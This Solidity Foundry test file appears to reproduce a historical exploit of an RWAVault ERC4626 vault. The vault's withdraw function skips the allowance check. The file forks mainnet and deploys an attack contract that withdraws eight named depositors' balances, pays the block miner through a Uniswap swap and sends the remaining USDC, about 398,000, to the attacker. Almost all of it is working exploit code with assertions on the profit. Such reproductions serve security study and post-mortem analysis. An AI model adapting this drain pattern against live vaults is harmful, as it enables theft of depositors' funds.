// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 398,655.47 USDC vault outflow
// Attacker : 0x7137804200a073f616d92e87007f1f100100b56a
// Attack Contract : 0x50c140c2f705fa9d0bd0f4f253bacf4087588d17
// Vulnerable Contract : 0x317aa10528ff675ef4c358ea6a5b7b5494325733
// Victim : 0xb9c7c84a1aa0dd40b5b38aae815ad0cdd2e5f88a
// Attack Tx : https://etherscan.io/tx/0x6b04344d5627df59d3bc645e7454f4605a90272852a91e435e370376643353b3

// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0x317aa10528ff675ef4c358ea6a5b7b5494325733#code
// Vault Entry/State Contract : https://etherscan.io/address/0xb9c7c84a1aa0dd40b5b38aae815ad0cdd2e5f88a#code

// @Analysis
// Twitter Guy : https://t.me/defimon_alerts/2958
//
// RWAVault overrides ERC4626 withdraw without the allowance spend required when msg.sender != owner.
// The attacker withdraws eight depositor balances to an attacker-controlled receiver, swaps 5,000 USDC
// to ETH for the block beneficiary, and forwards the remaining USDC to the attacker EOA.

address constant ATTACKER = 0x7137804200a073f616D92E87007f1f100100B56A;
address constant RWA_VAULT_ENTRY = 0xB9C7C84A1Aa0dD40b5B38Aae815AD0CDD2E5F88a;
address constant USDC_TOKEN = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
address constant WETH_TOKEN = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
address constant UNISWAP_V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
address constant BLOCK_MINER = 0x4838B106FCe9647Bdf1E7877BF73cE8B0BAD5f97;
uint256 constant TRACE_SWAP_USDC = 5_000_000_000;

contract ContractTest is BaseTestWithBalanceLog {
    uint256 private constant FORK_BLOCK = 24_979_315;

    IERC20 private constant usdc = IERC20(USDC_TOKEN);

    RWAVaultAttack private exploit;

    function setUp() public {
        vm.createSelectFork("mainnet", FORK_BLOCK);
        uint256 attackBlockTimestamp = 1_777_388_411;
        vm.warp(attackBlockTimestamp);
        vm.coinbase(BLOCK_MINER);

        fundingToken = USDC_TOKEN;
        attacker = ATTACKER;

        vm.label(ATTACKER, "Attacker EOA");
        vm.label(RWA_VAULT_ENTRY, "RWAVault Entry/State Clone");
        vm.label(USDC_TOKEN, "USDC");
        vm.label(WETH_TOKEN, "WETH");
        vm.label(UNISWAP_V2_ROUTER, "Uniswap V2 Router");
        vm.label(BLOCK_MINER, "Block Miner");

        exploit = new RWAVaultAttack(ATTACKER);
        vm.label(address(exploit), "Local Attack Contract");
    }

    function testExploit() public balanceLog {
        uint256 attackerBefore = usdc.balanceOf(ATTACKER);
        uint256 minerEthBefore = BLOCK_MINER.balance;

        // step 1: attacker EOA triggers a local helper that mirrors the historical attack contract's call order.
        vm.prank(ATTACKER);
        exploit.execute();

        uint256 usdcProfit = usdc.balanceOf(ATTACKER) - attackerBefore;
        uint256 minerEthProfit = BLOCK_MINER.balance - minerEthBefore;

        logTokenBalance(USDC_TOKEN, ATTACKER, "Attacker Final");
        emit log_named_decimal_uint("Block Miner ETH Received", minerEthProfit, 18);

        assertGt(usdcProfit, 387_000_000_000, "attacker USDC profit");
        assertGt(minerEthProfit, 2 ether, "miner ETH payment");
        assertEq(usdc.balanceOf(address(exploit)), 0, "attack helper forwarded USDC");
    }
}

contract RWAVaultAttack {
    address private immutable profitReceiver;

    IERC20 private constant usdc = IERC20(USDC_TOKEN);
    IERC4626 private constant vault = IERC4626(RWA_VAULT_ENTRY);
    IUniswapV2Router private constant router = IUniswapV2Router(payable(UNISWAP_V2_ROUTER));

    address[8] private victims = [
        0xC15D1F621480DD6b298A1AFF41E63b67E32ED51b,
        0x98269200D948896E09088482830f84454Da13e9a,
        0x5070Faba9361046c30b3f1976A13C1CaD09e8483,
        0xe9563779260c1B71E3C674534B8208666Eec38B5,
        0x5A0E2bd5311d066B022B88F5bF453cB8A5307fee,
        0xC15D1F621480DD6b298A1AFF41E63b67E32ED51b,
        0x1Acb62D792BF6aEca92c4fC79686c0D12c192fAA,
        0xaB2f2FEfAfC7EA9316C6538Ad63EBb2082585Ae6
    ];

    uint256[8] private requestedAssets = [
        100_000_000,
        1_200_000_000,
        270_000_000_000,
        3_136_000_000,
        6_380_000_000,
        9_900_000_000,
        2_048_000_000,
        100_000_000_000
    ];

    constructor(
        address profitReceiver_
    ) {
        profitReceiver = profitReceiver_;
    }

    function execute() external {
        // step 2: reproduce the typed withdraw amounts from the attack calldata.
        for (uint256 i; i < victims.length; ++i) {
            vault.withdraw(requestedAssets[i], address(this), victims[i]);
        }

        // step 3: swap the same 5,000 USDC through Uniswap V2 and pay ETH to the block beneficiary.
        usdc.approve(UNISWAP_V2_ROUTER, TRACE_SWAP_USDC);
        address[] memory path = new address[](2);
        path[0] = USDC_TOKEN;
        path[1] = WETH_TOKEN;
        uint256 traceDeadline = 1_787_388_410;
        router.swapExactTokensForETH(TRACE_SWAP_USDC, 0, path, BLOCK_MINER, traceDeadline);

        // step 4: forward the remaining USDC to the attacker EOA.
        usdc.transfer(profitReceiver, usdc.balanceOf(address(this)));
    }
}
